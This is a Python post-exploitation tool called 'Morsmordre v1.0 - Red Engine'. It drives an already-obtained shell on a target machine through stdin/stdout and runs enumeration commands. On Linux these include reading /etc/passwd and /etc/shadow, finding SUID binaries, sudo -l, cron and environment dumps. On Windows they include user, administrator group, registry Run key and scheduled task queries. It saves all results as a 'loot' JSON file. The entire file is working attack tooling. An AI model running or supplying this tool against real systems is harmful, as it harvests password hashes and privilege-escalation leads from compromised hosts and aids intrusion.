#!/usr/bin/env python3
"""
Morsmordre v1.0 - Red Engine
Autonomous Post-Exploitation Enumeration
"""

import os
import sys
import json
import time
import select
from datetime import datetime
from typing import List, Dict

class Morsmordre:
    def __init__(self):
        self.target = os.environ.get('MORSMORDRE_TARGET', 'unknown')
        self.os_type = os.environ.get('MORSMORDRE_OS', 'Linux')
        self.lhost = os.environ.get('MORSMORDRE_LHOST', 'unknown')
        self.loot: List[Dict] = []
        self.timestamp = datetime.now().isoformat()
        
    def log(self, msg: str):
        """Log to stderr (local console, not socket)"""
        print(f"[*] {msg}", file=sys.stderr)
        
    def send_recv(self, cmd: str, timeout: float = 2.0) -> str:
        """Send command to target via stdout and read response from stdin"""
        # Clear any pending input first
        while select.select([sys.stdin], [], [], 0.1)[0]:
            sys.stdin.read(1024)
        
        # Send command
        sys.stdout.write(cmd + "\n")
        sys.stdout.flush()
        
        # Read response with timeout
        output = []
        start = time.time()
        
        while time.time() - start < timeout:
            if select.select([sys.stdin], [], [], 0.1)[0]:
                try:
                    chunk = sys.stdin.read(1024)
                    if chunk:
                        output.append(chunk)
                except:
                    break
                    
        return ''.join(output)
    
    def add_loot(self, cmd: str, output: str, category: str):
        self.loot.append({
            "timestamp": datetime.now().isoformat(),
            "category": category,
            "command": cmd,
            "output": output.strip()
        })
    
    def enum_linux(self):
        self.log("Starting Linux enumeration...")
        
        cmds = [
            ("id", "privilege"),
            ("whoami", "privilege"),
            ("uname -a", "system"),
            ("cat /etc/passwd", "credentials"),
            ("cat /etc/shadow", "credentials"),
            ("sudo -l", "privilege"),
            ("find / -perm -4000 -type f 2>/dev/null", "privilege"),
            ("netstat -tulpn 2>/dev/null || netstat -tuln", "network"),
            ("ps aux", "processes"),
            ("crontab -l 2>/dev/null", "persistence"),
            ("cat /etc/crontab 2>/dev/null", "persistence"),
            ("ls -la /home", "users"),
            ("env", "environment"),
        ]
        
        for cmd, cat in cmds:
            try:
                out = self.send_recv(cmd)
                self.add_loot(cmd, out, cat)
            except Exception as e:
                self.log(f"Failed: {cmd} - {e}")
    
    def enum_windows(self):
        self.log("Starting Windows enumeration...")
        
        cmds = [
            ("whoami", "privilege"),
            ("whoami /priv", "privilege"),
            ("systeminfo", "system"),
            ("net user", "credentials"),
            ("net localgroup administrators", "privilege"),
            ("ipconfig /all", "network"),
            ("tasklist /v", "processes"),
            ("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "persistence"),
            ("schtasks /query /fo LIST", "persistence"),
        ]
        
        for cmd, cat in cmds:
            try:
                out = self.send_recv(cmd)
                self.add_loot(cmd, out, cat)
            except Exception as e:
                self.log(f"Failed: {cmd} - {e}")
    
    def save(self):
        filename = f"morsmordre_{self.target.replace('.', '_')}_{int(time.time())}.json"
        data = {
            "target": self.target,
            "os": self.os_type,
            "timestamp": self.timestamp,
            "commands_executed": len(self.loot),
            "loot": self.loot
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            self.log(f"Loot saved: {filename}")
        except Exception as e:
            self.log(f"Failed to save loot: {e}")
    
    def run(self):
        self.log(f"Morsmordre v1.0 - Target: {self.target} ({self.os_type})")
        
        # Small delay to let shell stabilize
        time.sleep(0.5)
        
        if "Windows" in self.os_type:
            self.enum_windows()
        else:
            self.enum_linux()
            
        self.save()
        self.log("Enumeration complete")

if __name__ == "__main__":
    m = Morsmordre()
    m.run()
